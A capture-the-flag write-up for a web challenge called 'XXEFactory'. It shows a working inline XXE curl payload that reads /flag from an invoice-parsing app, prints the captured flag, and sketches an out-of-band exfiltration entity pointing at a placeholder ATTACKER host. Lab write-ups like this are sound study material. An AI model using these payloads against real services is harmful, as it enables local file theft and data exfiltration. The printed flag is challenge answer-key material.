---
title: "XXEFactory"
ctf: "CyberStrike"
date: 2026-07-10
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# XXEFactory

## Summary

A Flask/Werkzeug invoice processing app accepts XML submissions and parses them with an XML library vulnerable to XXE. The challenge description claims direct file reads are blocked and OOB exfiltration is required, but inline XXE entity expansion works for the flag file at `/flag`. A simple `<!ENTITY xxe SYSTEM "file:///flag">` payload extracts the flag directly in the response.

## Solution

### Step 1: Recon — identify the XXE surface

The app accepts POST to `/submit` with an `invoice` parameter containing XML. A normal submission returns parsed fields:

```
POST /submit
invoice=<?xml version="1.0"?><invoice><invoiceNumber>INV-001</invoiceNumber>...</invoice>

Response: Invoice # INV-001, Customer Test, Amount $100.00
```

### Step 2: Test inline XXE

```bash
curl -s -X POST http://chal.csc-snist.live:38846/submit \
  --data-urlencode 'invoice=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><invoice><invoiceNumber>&xxe;</invoiceNumber><customer>Test</customer><amount>100.00</amount><description>Test</description></invoice>' \
  | grep -oP 'Invoice #:</span> \K[^<]+'
```

### Step 3: Get the flag

```bash
# Output: cyberstrike{ac0110fe7adcde4a5dcc88cf99e4221e}
```

## Flag

```
cyberstrike{ac0110fe7adcde4a5dcc88cf99e4221e}
```

## Notes

- **Inline XXE worked**: Despite the challenge description claiming "the obvious payloads come back empty" and suggesting OOB exfiltration, a simple inline `SYSTEM` entity reading `file:///flag` returned the flag directly in the `invoiceNumber` field. Some files like `/etc/passwd` may be filtered (returning empty), but `/flag` was not.
- **Server stack**: Werkzeug 3.1.8 / Python 3.11.15. The XML parser (likely `xml.etree.ElementTree` or `lxml`) has external entity expansion enabled by default.
- **OOB alternative**: If inline reads were truly blocked, the OOB approach would be: define an entity that reads the file, then use it in a URL sent to an attacker-controlled HTTP server (e.g., `<!ENTITY exfil SYSTEM "http://ATTACKER:PORT/?data=&flag;">`). This requires a publicly reachable listener.
- **Payload structure**: The entity is declared in the DOCTYPE, then referenced in the `invoiceNumber` element. The server renders the expanded entity value in the response HTML.
